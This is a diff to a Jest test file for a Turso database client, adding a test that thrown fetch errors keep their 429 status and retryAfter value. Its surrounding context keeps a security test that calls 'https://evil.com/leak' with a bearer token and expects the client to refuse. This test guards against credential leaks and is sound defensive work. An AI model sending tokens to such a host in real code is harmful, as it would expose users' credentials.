@@ -2,6 +2,7 @@ import {
 	isTursoDatabaseUrl,
 	isTursoHost,
 	parseSseBuffer,
+	TursoAPIError,
 	tryGetStoredKey,
 	tursoFetchJson,
 	tursoPipelineHealthCheck,
@@ -94,6 +95,30 @@ describe('tursoFetchJson security', () => {
 		await expect(
 			tursoFetchJson('https://evil.com/leak', { apiKey: 'secret-token' }),
 		).rejects.toThrow('Refusing to send bearer token to non-Turso host');
+	});
+
+	it('keeps status and retryAfter metadata on thrown fetch errors', async () => {
+		const originalFetch = global.fetch;
+		const exhaustedRetryError = Object.assign(new Error('Too Many Requests'), {
+			status: 429,
+			retryAfter: 1_500,
+		});
+		global.fetch = jest.fn().mockRejectedValueOnce(exhaustedRetryError);
+
+		try {
+			await tursoFetchJson('https://api.turso.tech/v1/auth/validate', {
+				apiKey: 'secret-token',
+			});
+			throw new Error('expected tursoFetchJson to throw');
+		} catch (error) {
+			expect(error).toBeInstanceOf(TursoAPIError);
+			const apiError = error as TursoAPIError;
+			expect(apiError.message).toBe('Too Many Requests');
+			expect(apiError.status).toBe(429);
+			expect(apiError.retryAfter).toBe(1_500);
+		} finally {
+			global.fetch = originalFetch;
+		}
 	});
 });
 
